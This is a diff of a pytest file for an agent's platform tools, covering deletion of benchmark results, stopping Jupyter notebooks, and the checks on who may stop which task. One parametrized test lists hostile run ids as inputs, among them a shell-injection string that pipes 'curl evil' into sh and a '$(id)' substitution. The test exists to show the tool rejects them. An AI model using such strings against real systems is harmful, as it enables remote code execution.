@@ -5,6 +5,7 @@ import json
 
 import httpx
 import pytest
+from mcp.server.fastmcp.exceptions import ToolError
 
 from app.config import settings
 from app.services import request_ctx
@@ -12,9 +13,10 @@ from app.tools import actions as A
 from app.tools.actions import (
     _blank_fields,
     _resolve_config,
+    delete_run_results,
     start_jupyter,
     start_workload,
-    stop_workload,
+    stop_jupyter,
 )
 
 # GET /api/v1/models/config as aistudio-server answers it: run config plus licence info.
@@ -133,8 +135,8 @@ def test_a_refusal_from_aistudio_is_reported_not_hidden(platform):
         ("GET", "/api/v1/models/config"): (200, dict(_CFG_LIVE)),
         ("POST", "/api/v1/benchmarks/start"): (422, {"detail": "config.dataset_path is required"}),
     }
-    out = asyncio.run(start_workload.ainvoke({"model": "m", "node_ip": "10.0.0.5", "dataset_path": "/d.json"}))
-    assert "refused" in out and "422" in out and "STARTED" not in out
+    with pytest.raises(ToolError, match="refused.*422"):
+        asyncio.run(start_workload.ainvoke({"model": "m", "node_ip": "10.0.0.5", "dataset_path": "/d.json"}))
 
 
 def test_start_workload_rejects_jupyter_as_model(platform):
@@ -156,31 +158,39 @@ def test_start_jupyter_without_a_node_asks(platform):
     assert "node" in out.lower() and not platform.requests
 
 
-def test_stop_workload_deletes_one_runs_results(platform):
+def test_delete_run_results_deletes_one_runs_results(platform):
     platform.answers = {("DELETE", "/api/v1/benchmarks/wl-20260101-abc123"):
                         (200, {"status": "deleted", "rows_deleted": 3})}
-    out = asyncio.run(stop_workload.ainvoke({"task_id": "wl-20260101-abc123"}))
+    out = asyncio.run(delete_run_results.ainvoke({"run_id": "wl-20260101-abc123"}))
     assert "Deleted" in out and "3 row" in out and "cannot be undone" in out
 
 
-def test_stop_workload_stops_a_notebook(platform):
+def test_stop_jupyter_stops_a_notebook(platform):
     platform.answers = {("DELETE", "/api/v1/jupyter/instances/jup-20260101-abc123"): (204, None)}
-    out = asyncio.run(stop_workload.ainvoke({"task_id": "jup-20260101-abc123"}))
+    out = asyncio.run(stop_jupyter.ainvoke({"task_id": "jup-20260101-abc123"}))
     assert "Stopped Jupyter notebook" in out
     assert platform.sent("DELETE", "/api/v1/jupyter/instances/jup-20260101-abc123")
 
 
-def test_stop_workload_reports_an_unknown_run(platform):
-    out = asyncio.run(stop_workload.ainvoke({"task_id": "wl-20260101-abc123"}))
-    assert "refused" in out and "404" in out
+def test_an_unknown_run_is_an_error(platform):
+    with pytest.raises(ToolError, match="refused.*404"):
+        asyncio.run(delete_run_results.ainvoke({"run_id": "wl-20260101-abc123"}))
 
 
-@pytest.mark.parametrize("bad", ["x'; curl evil|sh; echo '", "wl-1 2", "$(id)", "a\nb", "../all", ""])
+# "all", "bulk" and "filter" are the bulk-delete routes beside DELETE /api/v1/benchmarks/{run_id}.
+@pytest.mark.parametrize("bad", ["x'; curl evil|sh; echo '", "wl-1 2", "$(id)", "a\nb", "../all", "",
+                                 "all", "bulk", "filter", "jup-20260101-abc123"])
 def test_a_run_id_that_is_not_one_never_reaches_the_platform(platform, bad):
-    out = asyncio.run(stop_workload.ainvoke({"task_id": bad}))
-    assert "Deleted" not in out and not platform.requests, out
+    with pytest.raises(ToolError, match="not an id"):
+        asyncio.run(delete_run_results.ainvoke({"run_id": bad}))
+    assert not platform.requests
 
 
+@pytest.mark.parametrize("bad", ["wl-20260101-abc123", "all", ""])
+def test_stop_jupyter_takes_only_a_notebook_id(platform, bad):
+    with pytest.raises(ToolError, match="not an id"):
+        asyncio.run(stop_jupyter.ainvoke({"task_id": bad}))
+    assert not platform.requests
 
 
 # ── only the creator or an admin stops a task ──
@@ -234,28 +244,34 @@ def test_starting_a_task_sends_its_creator(api):
     assert api.created_by == {_JUP: "bob"}
 
 
+def _refusal(sub, role, tool, **args) -> str:
+    with pytest.raises(ToolError) as exc:
+        _run_as(sub, role, tool, **args)
+    return str(exc.value)
+
+
 def test_the_creator_can_stop_their_own_task(api):
     _run_as("bob", "operator", start_jupyter, node_ip="10.0.0.6")
-    assert "Stopped" in _run_as("bob", "operator", stop_workload, task_id=_JUP)
+    assert "Stopped" in _run_as("bob", "operator", stop_jupyter, task_id=_JUP)
     assert _JUP not in api.created_by
 
 
 def test_another_operator_cannot(api):
     _run_as("bob", "operator", start_jupyter, node_ip="10.0.0.6")
-    out = _run_as("carol", "operator", stop_workload, task_id=_JUP)
+    out = _refusal("carol", "operator", stop_jupyter, task_id=_JUP)
     assert out.startswith("Refused:") and "started by bob" in out
     assert not api.sent("DELETE", f"/api/v1/jupyter/instances/{_JUP}")
 
 
 def test_an_admin_can_stop_anyones_task_without_a_lookup(api):
     _run_as("bob", "operator", start_jupyter, node_ip="10.0.0.6")
-    assert "Stopped" in _run_as("root", "admin", stop_workload, task_id=_JUP)
+    assert "Stopped" in _run_as("root", "admin", stop_jupyter, task_id=_JUP)
     assert not api.sent("GET", f"/api/v1/jupyter/instances/{_JUP}/status")
 
 
 def test_a_benchmark_runs_creator_is_read_from_its_status_route(api):
     api.created_by[_WL] = "bob"
-    assert "Deleted" in _run_as("bob", "operator", stop_workload, task_id=_WL)
+    assert "Deleted" in _run_as("bob", "operator", delete_run_results, run_id=_WL)
     assert api.sent("GET", f"/api/v1/benchmarks/{_WL}/status")
 
 
@@ -263,7 +279,7 @@ def test_a_benchmark_runs_creator_is_read_from_its_status_route(api):
 def test_a_task_with_no_creator_on_record_is_admin_only(api, on_record):
     if on_record is None:
         api.created_by[_WL] = None            # started through the UI / REST without one
-    out = _run_as("bob", "operator", stop_workload, task_id=_WL)
+    out = _refusal("bob", "operator", delete_run_results, run_id=_WL)
     assert out.startswith("Refused:") and "no creator on record" in out
     assert not api.sent("DELETE", f"/api/v1/benchmarks/{_WL}")
 
@@ -272,11 +288,5 @@ def test_an_unreadable_creator_fails_closed(api, monkeypatch):
     async def down(task_id):
         raise A.platform_api.PlatformApiError("aistudio-server answered 500")
     monkeypatch.setattr(A.platform_api, "workload", down)
-    out = _run_as("bob", "operator", stop_workload, task_id=_WL)
+    out = _refusal("bob", "operator", delete_run_results, run_id=_WL)
     assert out.startswith("Refused:") and "could not read who started" in out and not api.requests
-
-
-def test_a_refused_stop_is_not_remembered_as_done(api):
-    # A refusal is a plain answer, not Done, so it is never replayed as a success.
-    out = _run_as("carol", "operator", stop_workload, task_id=_JUP)
-    assert not isinstance(out, A.Done)
